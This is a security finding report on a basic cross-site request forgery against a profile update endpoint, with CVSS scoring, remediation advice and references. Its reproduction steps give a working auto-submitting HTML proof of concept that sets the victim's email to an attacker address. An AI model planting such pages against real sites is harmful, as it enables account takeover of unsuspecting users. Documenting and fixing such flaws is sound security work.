# CSRF - Basic Cross-Site Request Forgery

**Title:** CSRF on Profile Update Endpoint

**Severity:** Medium

**Impact:** High

**Exploitability:** Medium

**CVSS Base Score:** 6.5

**CVSS v3 Vector:** CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N

**Vulnerability Type:** Cross-Site Request Forgery

**Target:** Authenticated state-changing endpoints (e.g. profile update)

## Impact

Unauthorized changes to user accounts or settings performed on behalf of the victim.

## Description

The application relies on cookies for authentication without proper anti-CSRF protections. An attacker can trick the victim into submitting a forged request.

## Steps to Reproduce

1. Capture a state-changing request (e.g. profile update).
2. Create a malicious page that auto-submits the form:

```html
<html>
  <body>
    <form id="submitMe" action="http://target/api/update-profile" method="POST">
      <input type="hidden" name="email" value="attacker@evil.com" />
      <input type="hidden" name="telephone" value="(227)-750-8112" />
      <input type="hidden" name="country" value="CSRF_POC" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.getElementById("submitMe").submit()
    </script>
  </body>
</html>
```

Serve it locally (`python -m http.server 1337`) and have the victim visit while logged into the target.

GET-based CSRF can use similar approach with GET forms or image tags for simple cases.

## Recommendation

Use synchronizer tokens (anti-CSRF tokens) that are unique per session and validated on every state-changing request. Implement SameSite cookie attributes (`Lax` or `Strict`). Use custom request headers for AJAX calls (browsers do not send them cross-origin by default).

## References

- OWASP CSRF Prevention Cheat Sheet
- PortSwigger CSRF labs
